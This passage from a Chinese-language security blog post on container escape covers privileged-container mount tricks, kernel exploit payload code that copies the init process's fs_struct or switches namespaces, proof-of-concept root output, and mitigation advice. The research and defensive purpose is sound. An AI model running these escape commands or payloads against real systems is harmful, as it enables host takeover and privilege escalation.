Capabilities for `14&#x27;: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_rｆaw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep</code></pre><p>使用 <code>rkt enter</code> 開啟的 <code>bash</code> 有 <code>cap_sys_admin</code>，可以試著用之前說到的 <code>mount</code> 方法存取 Host 的檔案！</p><p>但這裡會遇到一些問題，<code>mknod</code> 出來的 Block special file 放的位置會影響能不能 <code>mount</code>，所以這邊用一個改良的做法：</p><pre><code># mkdir mydev
# mkdir rootfs
# mount -t devtmpfs none mydev
# mount mydev/sda1 rootfs</code></pre><p>直接 <code>mount</code> 一個型態為 devtmpfs 的資料夾， Linux kernel 就會自動把所有的 Device file 準備好，我們只要 <code>mount mydev/sda1</code> 就能存取 Host 的根目錄！</p><br/><h3 id="linux-kernel-exploit">Linux kernel exploit</h3><p>前面講到的 Privileged container 以及 Container Engine bug 需要在 Container 內有 <code>root</code> 權限，但並不是每個服務都是以 <code>root</code> 權限運行，例如 HTTP server 通常會以較低權限的使用者如 <code>www-data</code> 身份執行，聰明的你一定注意到了，利用 Linux kernel exploit 獲得 <code>root</code> 權限然後再 Escape！</p><p>其實，有 Linux kernel exploit 的話可以直接 Escape！Container 用到的 Namespaces、Cgroups 等都是由 Linux kernel 提供的功能，所以如果在 Kernel space 內改寫相關結構，再跳回 User space，就能控制 Host，而且也不需要 Container 的漏洞！</p><p>讓我們看看 Linux kernel 內管理 Process 的結構 <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L818"><code>task_struct</code></a></p><pre><code class="lang-clike=">struct task_struct {
    /* ... */
    /*
     * Pointers to the (original) parent process, youngest child, younger sibling,
     * older sibling, respectively.  (p-&gt;father can be replaced with
     * p-&gt;real_parent-&gt;pid)
     */
    
    /* Real parent process: */
    struct task_struct __rcu    *real_parent;
    
    /* Recipient of SIGCHLD, wait4() reports: */
    struct task_struct __rcu    *parent;
    /* ... */
    /* Filesystem information: */
    struct fs_struct        *fs;
    /* ... */
}</code></pre><p>裡面有一個 <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/fs_struct.h#L9"><code>fs_struct</code></a>，再往裡面看看：</p><pre><code class="lang-clike=">struct fs_struct {
    int users;
    spinlock_t lock;
    seqcount_t seq;
    int umask;
    int in_exec;
    struct path root, pwd;
} __randomize_layout;</code></pre><p><code>task_struct-&gt;fs</code> 存放著這個 Process 的 <code>root</code> 以及工作目錄，而我們能夠用 <code>task_struct-&gt;real_parent</code> 取得 Parent process 的 <code>task_struct</code>，所以我們可以不斷的往上找，直到找到 <code>PID = 1</code>，也就是位於 Host 的 Init process，然後把它的 <code>fs_struct</code> 複製給自己，就可以存取 Host 的根目錄了！</p><p><img alt="Blog_9-12" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-12_97ea7b5407.png" class="css-1h5x3dy"/></p><p>這個 Exploit 取自 Nick Freeman 的文章  <a href="https://capsule8.com/blog/practical-container-escape-exercise/">An Exercise in Practical Container Escapology</a>，他修改了由 Andrey Konovalov 寫的 Linux Kernel exploit，讓它可以 Escape container：</p><pre><code class="lang-clike=">typedef unsigned long __attribute__((regparm(3))) (*_copy_fs_struct)(unsigned long init_task);

uint64_t get_task(void) {
    uint64_t task;
    asm volatile (&quot;movq %%gs: 0xD380, %0&quot;:&quot;=r&quot;(task));
    return task;
}

void get_root(void) {

    int i;
    char *task;
    char *init;
    uint32_t pid = 0;


    ((_commit_creds)(COMMIT_CREDS))(
        ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));


    task = (char *)get_task();
    init = task;
    while (pid != 1) {
        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
        pid = *(uint32_t *)(init + TASK_PID_OFFSET);
    }

  
    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));
}</code></pre><p>每個 Linux kernel exploit 都會有一行：</p><pre><code>    ((_commit_creds)(COMMIT_CREDS))(
        ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));</code></pre><p>用途是建立擁有所有權限的 Credentials 並使用它，也就是讓這個 Process 變成 <code>root</code> 權限。而這個 Exploit 就是在它之後加上：</p><pre><code class="lang-clike">    task = (char *)get_task();
    init = task;
    while (pid != 1) {
        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
        pid = *(uint32_t *)(init + TASK_PID_OFFSET);
    }

  
    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));</code></pre><p>用 <code>while</code> 迴圈找到 Init process，然後呼叫 <code>copy_fs_struct</code> 把 <code>fs_struct</code> 複製回來，就能看到 Host 的根目錄。</p><iframe src="https://asciinema.org/a/356361/embed?" id="asciicast-iframe-356361" name="asciicast-iframe-356361" scrolling="no" allowfullscreen="" style="overflow:hidden;margin:0px;border:0px;display:inline-block;width:100%;float:none;visibility:visible;height:468px;:"></iframe><p>但還沒結束！我們實際上還沒繞過 Namespaces 的限制，如果使用 <code>kill</code> 是會失敗的：</p><pre><code>ubuntu@ubuntu:/$ ./poc
[^] starting
[=] running KASLR defeat exploit (CVE-2017-18344)
[0] enumerating divide_error() location (CVE-2017-18344)
[&gt;] setting up proc reader
...
[+] done, should be root now
[6] checking if we got root
[+] got r00t ^_^
root@ubuntu:/# ps aux | grep cat
user     22522  0.0  0.0   7444   680 pts/1    S+   17:34   0:00 cat
root     22547  0.0  0.0  11288   924 pts/3    S+   17:35   0:00 grep --color=auto cat
root@ubuntu:/# kill 22522
bash: kill: (22522) - No such process</code></pre><p>但也足夠了，可以用 Docker 執行 Privileged container 再 Escape。或是 Nick Freeman 提供的作法：</p><blockquote><ul><li><div>Write or overwrite host or other container files (including kubelet configs)</div></li><li><div>Interact with Docker (perhaps pull and launch a new fun privileged container)</div></li><li><div>Inject code or harvest data from processes (host or container) via /proc/pid/mem</div></li><li><div>Load/ unload kernel modules</div></li></ul></blockquote><br/><p>這麼一來就可以不用花費力氣在換 Namespaces 上，但也有一篇文章提到更換 Namespaces 的方法 <a href="https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation">The Route to Root: Container Escape Using Kernel Exploitation</a>：</p><pre><code class="lang-clike=">void get_root_payload( void) {

        ((_commit_creds)(COMMIT_CREDS))(
                ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0)
        );

        // -------- NAMESPACE DOCKER EXPLOIT  --------
        // copy nsproxy from init_nsproxy to pid 1 of the container
        unsigned long long g = ((_find_task_vpid)(FIND_TASK))(1);

        // now, do the magic.... !!!! Simple black magic doesn&#x27;t work on current process!!!!
        ((_switch_task_namespaces)(SWITCH_TASK_NS))(( void *)g, (void *)INIT_NSPROXY);

        // prepare the two namespace FDs by opening the respective files
        long fd = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, &quot;/proc/1/ns/mnt&quot;, O_RDONLY, 0);
        ((_sys_setns)(SYS_SETNS))( fd, 0);

        fd      = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, &quot;/proc/1/ns/pid&quot;, O_RDONLY, 0);
        ((_sys_setns)(SYS_SETNS))( fd, 0);
}</code></pre><p>這篇的作法是開啟 <code>/proc/1/ns/</code> 資料夾下的檔案，也就是 Namesapces 提供的各個部件（這邊選擇 <code>mnt</code> 與 <code>pid</code>），然後呼叫 <code>setns</code> 把自己的 Namespaces 設定成跟 Host 一樣，這樣就不用額外的步驟，可以直接存取 Host！</p><br/><h2 id="mitigation">Mitigation</h2><p>上述說到的 Privileged container 是最容易 Escape 的 Container ，若一定得使用它開服務的話，要把它當作 Host 的服務看待，做好權限管理，只要駭客沒有足夠的權限（ <code>root</code> ），就不能使用 <code>mount</code> 的方式存取 Host 資源，大幅降低它所造成的危害。Docker 可以用 <code>docker run -u {uid}:{gid}</code>，以較低的使用者權限開啟 Container，然後把要開啟的服務放在一般使用者可用的 <code>port &gt;= 1024</code> 上，這麼一來就算駭客打下服務，也沒有足夠的權限使用 <code>mount</code> 做進一步的攻擊：</p><pre><code># docker run --privileged -it -u 1000 python bash
I have no name!@6b6f0f0bc93d:/$ python -m http.server 8080 &amp;
[1] 7
I have no name!@6b6f0f0bc93d:/$ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

I have no name!@6b6f0f0bc93d:/$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
1000         1  0.1  0.0   5748  3632 pts/0    Ss   02:51   0:00 bash
1000         7  4.0  0.1  25996 18840 pts/0    S    02:51   0:00 python -m http.server 8080
1000         8  0.0  0.0   9388  3100 pts/0    R+   02:51   0:00 ps aux
I have no name!@6b6f0f0bc93d:/$ mkdir /tmp/t1; mkdir /tmp/t2; mount --bind /tmp/t1 /tmp/t2
mount: only root can use &quot;--bind&quot; option</code></pre><p>也可以善用 <code>setuid</code>，切換到權限較低的使用者。剩下的就是定期更新、檢查使用的產品是否出現漏洞，以及避免使用不再維護的產品。</p><br/><h2 id="container-security-is-linux-security">Container security is Linux security</h2><p>Container 仰賴 Linux kernel 提供的機制，隔離出一塊空間供 Container 使用，所以當這些機制出現問題或開發者設計時沒有考慮周全，原以為安全的 Container 就有可能被駭客利用，造成更大的危害。今天分別介紹 Privileged Container、Container Engine bug 以及 Linux kernel exploit 這三種攻擊情境，都是利用 Linux 本身的特性達到存取 Host 資源的效果。希望你們會喜歡，也祝各位都能成功 Escape！</p><br/><h2 id="references">References</h2><ul><li><div><a href="https://unit42.paloaltonetworks.com/breaking-out-of-coresos-rkt-3-new-cves/">Breaking Out of rkt – 3 New Unpatched CVEs</a></div></li><li><div><a href="https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation">The Route to Root: Container Escape Using Kernel Exploitation</a></div></li><li><div><a href="https://capsule8.com/blog/practical-container-escape-exercise/">An Exercise in Practical Container Escapology</a></div></li><li><div><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host</a></div></li><li><div><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf">A Compendium of Container Escapes</a></div></li><li><div><a href="https://gist.github.com/FrankSpierings/5c79523ba693aaa38bc963083f48456c">Linux Container Escapes and Hardening</a></div></li><li><div><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">Understanding Docker container escapes</a></div></li></ul><br/></div></div></div><div class="css-1h6gcr1"><div class="css-2uv98o">Share:<div class="css-3ostf4"><a class="css-18hi9tf"><button aria-label="linkedin" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="sns/linkedin/nor"><path class="dark" d="M21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 L21,0 Z M19.0257087,9.0309163 C16.1146435,7.90189457 14.1125239,9.13845978 13.5311978,10.2828185 L13.5311978,10.2828185 L13.4415783,10.4056989 L13.3876217,10.4056989 L13.3876217,8.83634022 L10.0184804,8.83634022 L10.0184804,20.1829163 L13.5311978,20.1829163 L13.5316179,14.0152782 C13.5352018,13.9482549 13.5643166,13.4915116 13.7156109,12.9431337 C13.879513,12.3490576 14.4018935,11.8678837 15.0368065,11.7243076 C15.6717196,11.5811011 16.2554478,11.7243076 16.5934152,11.8678837 C16.9313826,12.0110902 17.1054478,12.3643946 17.1745565,12.471938 C17.2436652,12.5794815 17.458937,13.2476554 17.458937,13.6240576 L17.458937,13.6240576 L17.458937,20.1829163 L20.9921652,20.1829163 L20.9927319,13.1625978 C21.0044427,12.9799919 21.1719641,9.86344891 19.0257087,9.0309163 Z M7.82684783,8.83641413 L4.2731087,8.83641413 L4.2731087,20.1828054 L7.82684783,20.1828054 L7.82684783,8.83641413 Z M6.05809022,3.18481957 C4.92149239,3.18481957 3.99998152,4.10614565 3.99998152,5.24292826 C3.99998152,6.37952609 4.92149239,7.30085217 6.05809022,7.30085217 C7.19468804,7.30085217 8.11619891,6.37952609 8.11619891,5.24292826 C8.11619891,4.10614565 7.19468804,3.18481957 6.05809022,3.18481957 Z" id="Combined-Shape"></path></g></g></svg></div></button></a><a class="css-18hi9tf"><button aria-label="twitter" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="sns/twitter/hover" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="dark" d="M3,0 L21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 Z M9.40543979,19.2 C15.5354921,19.2 18.8873246,14.1204188 18.8873246,9.71811518 C18.8873246,9.57298429 18.8873246,9.4278534 18.8804136,9.28963351 C19.5300471,8.81968586 20.0967487,8.23225131 20.5459634,7.56188482 C19.9516178,7.82450262 19.3088953,8.00418848 18.6316178,8.08712042 C19.3227173,7.67246073 19.8479529,7.02282723 20.0967487,6.24188482 C19.4540262,6.62198953 18.7421937,6.89842932 17.9819843,7.0504712 C17.3738168,6.4008377 16.5099424,6 15.5493141,6 C13.7109895,6 12.2182147,7.49277487 12.2182147,9.33109948 C12.2182147,9.59371728 12.2458586,9.84942408 12.3080576,10.0913089 C9.53674869,9.95308901 7.08334555,8.62617801 5.4385288,6.60816754 C5.15517801,7.09884817 4.98931414,7.67246073 4.98931414,8.28062827 C4.98931414,9.4347644 5.57674869,10.4575916 6.47517801,11.0519372 C5.92920942,11.0381152 5.41779581,10.8860733 4.96858115,10.6372775 C4.96858115,10.6510995 4.96858115,10.6649215 4.96858115,10.6787435 C4.96858115,12.2959162 6.11580628,13.6366492 7.64313613,13.947644 C7.36669634,14.0236649 7.06952356,14.0651309 6.76543979,14.0651309 C6.55119895,14.0651309 6.34386911,14.0443979 6.13653927,14.0029319 C6.55810995,15.3298429 7.78826702,16.2904712 9.24648691,16.3181152 C8.10617277,17.2096335 6.66868586,17.7417801 5.10680105,17.7417801 C4.83727225,17.7417801 4.57465445,17.7279581 4.31203665,17.6934031 C5.77025654,18.6471204 7.52564921,19.2 9.40543979,19.2"></path></g></svg></div></button></a><a class="css-18hi9tf"><button aria-label="facebook" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24" version="1.1"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="dark" d="M22,0 C23.1045695,-2.02906125e-16 24,0.8954305 24,2 L24,22 C24,23.0543618 23.1841222,23.9181651 22.1492623,23.9945143 L22,24 L22,24 L14,24 L14,23.978 L13.875,24 L13.875,15.5633307 L16.6710937,15.5633307 L17.203125,12.0733717 L13.875,12.0733717 L13.875,9.80860051 C13.875,8.85381375 14.3398828,7.92315016 15.8305781,7.92315016 L15.8305781,7.92315016 L17.34375,7.92315016 L17.34375,4.95196885 C17.34375,4.95196885 15.9704766,4.71616081 14.6575781,4.71616081 C11.9165156,4.71616081 10.125,6.3875682 10.125,9.41345698 L10.125,9.41345698 L10.125,12.0733717 L7.078125,12.0733717 L7.078125,15.5633307 L10.125,15.5633307 L10.125,24 C10.0832306,23.9934058 10.0415327,23.9865949 9.99990751,23.9795684 L10,24 L2,24 C0.8954305,24 1.3527075e-16,23.1045695 0,22 L0,2 C-1.3527075e-16,0.8954305 0.8954305,2.02906125e-16 2,0 L22,0 Z" id="path-1"></path></g></svg></div></button></a></div></div></div><div class="css-vkmg7y"></div></div></div><div class="css-m5kad0"><div class="css-1xf4lef default"></div><div class="css-1d0bkbk default"></div></div></div><div class="css-yx8k1m"><div class="css-k48dnj"><style data-emotion="css 10f0b8k">.css-10f0b8k{width:100%;height:100%;max-height:80vh;}</style><img src="" class="css-10f0b8k"/><div class="css-2eb87j"><svg height="10" viewBox="0 0 10 10" width="10"><defs><path id="a" d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path><mask id="b" fill="#fff"><use fill="#fff" fill-rule="evenodd" xlink:href="#a"></use></mask></defs><g fill="#f5f2e9" fill-rule="evenodd" transform="translate(-.333333 -.333333)"><use xlink:href="#a"></use><g mask="url(#b)"><path d="m0 0h16v16h-16z" transform="translate(-2.666667 -2.666667)"></path></g></g></svg></div></div></div></main><footer class="css-1j4sz91"><div class="css-1rid8u3"><div class="css-mp3uzg"><svg width="84px" height="84px" viewBox="0 0 84 84"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="footer-tmp/nor" transform="translate(-1166.000000, 0.000000)"><g id="footer/nor"><g id="Top" transform="translate(1166.000000, 0.000000)"><g id="scroll"><polygon id="Rectangle" fill="#d93751" points="42 0 84 42 42 84 0 42"></polygon><path d="M57,56.7989281 L42,70.9217351 L27,56.7989281 M42,70.9217351 L42.5,39.9444444" id="Combined-Shape" stroke="#FFFFFF" stroke-linecap="round" stroke-linejoin="round" transform="translate(42.000000, 55.222222) scale(1, -1) translate(-42.000000, -55.222222) "></path><text id="TOP" font-family="NotoSansCJKtc-Light, Noto Sans CJK TC" font-size="12" font-weight="300" fill="#FFFFFF"><tspan x="30.612" y="32">TOP</tspan></text></g></g></g></g></g></svg></div></div><div class="css-1742rmd"><a class="css-1xlcuzt" href="/tw/"><img src="/images/logo_contact.svg" alt=""/></a><div class="css-4qsnzi"><div class="css-tu40hi"><div class="css-9tw39e disable"><a href="/twundefined"><style data-emotion="css h6a8fj">.css-h6a8fj{display:-webkit-box;display:-webkit-unset;display:-ms-unsetbox;display:unset;cursor:pointer;margin:0;color:#4c433f;font-size:14px;font-weight:bold;}</style><h6 class="css-1o9043k css-h6a8fj">解決方案</h6></a></div><div class="css-ipgxcm"><div class="css-cssveg"><a href="/tw/products/threatsonar"><div class="css-1bu2g12">ThreatSonar</div></a></div><div class="css-cssveg"><a href="/tw/products/threatvision"><div class="css-1bu2g12">ThreatVision</div></a></div></div></div><div class="css-tu40hi"><div class="css-9tw39e disable"><a href="/twundefined"><style data-emotion="css h6a8fj">.css-h6a8fj{display:-webkit-box;display:-webkit-unset;display:-ms-unsetbox;display:unset;cursor:pointer;margin:0;color:#4c433f;font-size:14px;font-weight:bold;}</style><h6 class="css-1o9043k css-h6a8fj">關於 TeamT5</h6></a></div><div class="css-ipgxcm"><div class="css-cssveg"><a href="/tw/about-us"><div class="css-1bu2g12">TeamT5 團隊</div></a></div><div class="css-cssveg"><a href="/tw/careers"><div class="css-1bu2g12">人才招募</div></a></div></div></div><div class="css-tu40hi"><div class="css-9tw39e"><a href="/tw/news-and-events"><style data-emotion="css h6a8fj">.css-h6a8fj{display:-webkit-box;display:-webkit-unset;display:-ms-unsetbox;display:unset;cursor:pointer;margin:0;color:#4c433f;font-size:14px;font-weight:bold;}</style><h6 class="css-1o9043k css-h6a8fj">最新消息</h6></a></div></div><div class="css-tu40hi"><div class="css-9tw39e"><a href="/tw/blog"><style data-emotion="css h6a8fj">.css-h6a8fj{display:-webkit-box;display:-webkit-unset;display:-ms-unsetbox;display:unset;cursor:pointer;margin:0;color:#4c433f;font-size:14px;font-weight:bold;}</style><h6 class="css-1o9043k css-h6a8fj">部落格</h6></a></div></div><div class="css-tu40hi"><div class="css-9tw39e disable"><a href="/twundefined"><style data-emotion="css h6a8fj">.css-h6a8fj{display:-webkit-box;display:-webkit-unset;display:-ms-unsetbox;display:unset;cursor:pointer;margin:0;color:#4c433f;font-size:14px;font-weight:bold;}</style><h6 class="css-1o9043k css-h6a8fj">聯絡我們</h6></a></div><div class="css-ipgxcm"><div class="css-cssveg"><a href="/tw/request-information"><div class="css-1bu2g12">索取資訊</div></a></div><div class="css-cssveg"><a href="/tw/become-a-partner"><div class="css-1bu2g12">成為合作夥伴</div></a></div></div></div></div></div><hr/><div class="css-f24dyb"><div class="css-vx1whx"><a class="css-nagi7g" href="/tw/privacy-and-cookies-policy">隱私權與Cookies使用政策</a><a class="css-nagi7g" href="/tw/terms-of-service">服務條款</a><a class="css-nagi7g" href="/tw/security-policy">資訊安全政策</a><div class="css-nagi7g disable">© 2020 TEAM T5, Inc. All Rights Reserved.</div></div><div class="css-1v3z295"><div class="css-cksic1"><select><option value="en">English</option><option selected="" value="tw">繁體中文</option><option value="jp">日本語</option></select><svg width="8px" height="4px" viewBox="0 0 8 4" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="footer/nor" transform="translate(-1227.000000, -341.000000)" fill="#4c433f"><g transform="translate(1170.000000, 333.000000)"><polygon id="Triangle" transform="translate(61.000000, 10.000000) scale(1, -1) translate(-61.000000, -10.000000) " points="61 8 65 12 57 12"></polygon></g></g></g></svg></div></div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"publish":true,"enable_form":false,"tags":[{"_id":"5ed467d0165e5f006fa403fd","name":"D39","createdAt":"2020-06-01T02:28:32.042Z","updatedAt":"2020-06-01T02:28:32.042Z","__v":0,"id":"5ed467d0165e5f006fa403fd"},{"_id":"5ed467b5165e5f006fa403fc","name":"vulnerability research ","createdAt":"2020-06-01T02:28:05.155Z","updatedAt":"2020-06-01T02:28:05.155Z","__v":0,"id":"5ed467b5165e5f006fa403fc"},{"_id":"5f573a18531f77004b1a3202","name":"container","createdAt":"2020-09-08T08:00:24.917Z","updatedAt":"2020-09-08T08:00:24.917Z","__v":0,"id":"5f573a18531f77004b1a3202"},{"_id":"5f573a20531f77004b1a3203","name":"docker","createdAt":"2020-09-08T08:00:32.243Z","updatedAt":"2020-09-08T08:00:32.243Z","__v":0,"id":"5f573a20531f77004b1a3203"},{"_id":"5ecf6d2cfedd7f004b269751","name":"Linux","createdAt":"2020-05-28T07:50:04.390Z","updatedAt":"2020-05-28T07:50:04.390Z","__v":0,"id":"5ecf6d2cfedd7f004b269751"}],"relative_posts":[],"_id":"5f573974531f77004b1a31fe","post_url":"container-escape-101","post_name":"Container Escape 101","publish_date":"2020-09-16T03:00:00.000Z","contents":[{"locale":"tw","_id":"5f573974531f77004b1a31ff","title":"Container Escape 101","context":"圖片來源：[Pixabay](https://pixabay.com/photos/emergency-exit-exit-sign-escape-1321134/)\n\n## 前言\n\n本月來到 D39 與大家分享近期有趣的研究，Lab 團隊雖然不像是科幻電影中的實驗室般，穿著帥氣的白袍與擁有高科技的實驗室，但我們主要專注於最新技術與威脅研究，與惡意程式作者們互相切磋是我們的日常。而 Lab 中的 D39 成員更致力於弱點安全與漏洞挖掘領域，研究範圍包含 Mobile、IOT、Linux、Windows 等有機會連網的系統與裝置都是我們的目標，期許能提升客戶產品安全性，打造優良的上網環境（笑）\n\n這一次由 D39 實習生 Jack，為我們精心整理 Container 相關的弱點攻擊方式，透過清楚易懂的介紹，帶大家了解究竟在駭客眼中的 Container，存在哪些資安問題呢？\n\n## 正文開始\n\n相信大家對 Docker 都不陌生，無論是想要架設網站、資料庫或郵件伺服器，只要一行 `docker run` 就能搞定，不用處理可怕的環境問題，但若它存在漏洞或一些錯誤的設定，跑在 Container 內的 Process 就有可能控制主機。\n\n這次與大家介紹 Container Escape 的一些攻擊方法，讓各位在使用 Container 時可以留意相關的安全隱憂，以及了解這些漏洞造成的影響。\n\n## Container\n\n在介紹攻擊方法之前，先來了解一下 Container 使用到的技術：\n\n* Namespaces\n* Cgroups\n* Seccomp\n* Capabilities\n* LSM\n* OverlayFS\n\n### Namespaces\n\nContainer 好用的地方在於，它能夠建立一個獨立的環境，可以放心地安裝一大堆想嘗試的套件，不怕弄髒自己的環境。要實現這個功能，Namespaces 扮演了一個很重要的角色。\n\n來看看 Linux Programmer's Manual [Man page](https://man7.org/linux/man-pages/man7/namespaces.7.html) 的描述：\n\n\u003eA namespace wraps a global system resource in an abstraction that makes it appear to the processes within the namespace that they have their own isolated instance of the global resource.  Changes to the global resource are visible to other processes that are members of the namespace, but are invisible to other processes.  One use of namespaces is to implement containers.\n\n這邊的「資源」（resource）指的就像 Mount point 或 PID，Namespaces 可以建立一個獨立的 Mount point 或 PID，讓 Container 僅能存取自己掛載的檔案系統或自己的 Process，與 Host 隔離開來，不會弄亂 Host 的檔案，或存取到 Host 的 Process 資訊。\n\n使用 Namespaces 的方式就是呼叫 `unshare`、`setns`、`clone` 等 System call，類別也不只有 Mount 與 PID，詳細可以看 [Man page](https://man7.org/linux/man-pages/man7/namespaces.7.html)。\n\n### Cgroups\n\nCgroups 透過 `cgroupfs` 控制 Process 所能使用的記憶體容量或 CPU 資源，讓 Process 不會因為一些 bug 讓整台電腦當機，Docker 可以用 `--cpu-shares` 來限制各個 Container 能用到的 CPU 資源。詳細請見 [Cgroups man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)。\n\n### Seccomp\nSeccomp (Secure Computing) 對 CTFer 可能不陌生，用來限制能夠使用的 System call，常見於一些 Shellcode 題。\n\nContainer 很常禁用 `mount` ，因為它是一個方便我們逃離 Container 的 System call，接下來就會說明如何利用 `mount` 逃出 Container。詳細請見 [Seccomp man page](https://man7.org/linux/man-pages/man2/seccomp.2.html)。\n\n### Capabilities\n\nCapabilities 從 Linux Kernel 2.2 開始加入，目的是將權限做更細緻的區隔，以 Container 來說，若直接給它 `root` 權限是不安全的，這意味著它可以隨意載入 Kernel module 或 `mount`，讓 Container 有機會存取 Host 資源，因此 Container 內的 `root` 只有一些基本的 Capabilities，如 CAP\\_CHOWN、CAP\\_KILL、CAP\\_SETUID、CAP\\_SETGID 等。Ubuntu 使用者可以安裝 `libcap2-bin` 並使用 `getpcaps {pid}` 查看該 Process 擁有哪些 Capabilities，詳細請看 [man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)。\n\n### LSM (Linux Security Module)\n\nLinux kernel 文件裡寫道：\n\n\u003e The primary users of the LSM interface are Mandatory Access Control (MAC) extensions which provide a comprehensive security policy.\n\n如 AppArmor 和 SELinux 都是 Linux Kernel 內建的 Security Module，透過它們專屬的設定檔可以限制 Process 的存取權限，像 Docker 就是使用 AppArmor 限制 `procfs` 以及 `mount`，保護 Host 資源。\n\n### OverlayFS\n\n許多 Container 使用 OverlayFS 當作它的檔案系統，如它的名字，目的就是要把兩個或多個檔案系統合併，讓它看起來是一個檔案系統。它使用了 `upper` 與 `lower` 區分兩種要合併的檔案系統，其中若 `upper` 與 `lower` 有相同檔案時，會以 `upper` 為主。我們用 Container 來解釋，Docker 把 `upper` 當作 Container layer、`lower` 當作 Image layer，我們在 `docker build` 的時候會產生 Image，利用這些 Image 我們可以很快地產出 Container，在 Image 內的檔案如 Ubuntu 預設的系統檔案就會被放在 Image layer，在 Container runtime 產生的檔案，例如 Log 檔會被放在 Container layer，這麼一來建立多個 Container 時可以讓它們的 Image layer 都是同一個，省下許多空間。\n\n來實驗一下，首先開兩個 Container：\n\n```\n$ docker run --name t1 -it ubuntu\nroot@e937832abc06:/#\n```\n\n```\n$ docker run --name t2 -it ubuntu\nroot@71c8a58e90ac:/#\n```\n\n檢查它們的 LowerDir：\n\n```\n$ docker inspect t1 | grep Lower\n                \"LowerDir\": ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,\n$ docker inspect t2 | grep Lower\n                \"LowerDir\": ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,\n```\n\n仔細一看，列出來的路徑幾乎是一樣的，接下來看看裡面有什麼：\n\n```\n$ sudo ls -alF /var/lib/docker/overlay2/07a2cbd7...dbdf/diff\ntotal 24\ndrwxr-xr-x 6 root root 4096 Nov 13  2019 ./\ndrwx------ 4 root root 4096 Nov 13  2019 ../\ndrwxr-xr-x 4 root root 4096 Nov  1  2019 etc/\ndrwxr-xr-x 2 root root 4096 Nov  1  2019 sbin/\ndrwxr-xr-x 3 root root 4096 Oct 30  2019 usr/\ndrwxr-xr-x 3 root root 4096 Oct 30  2019 var/\n```\n\n是很常見的系統資料夾！也就是 Image layer，接下來看 Container layer：\n\n```\nroot@e937832abc06:/# echo 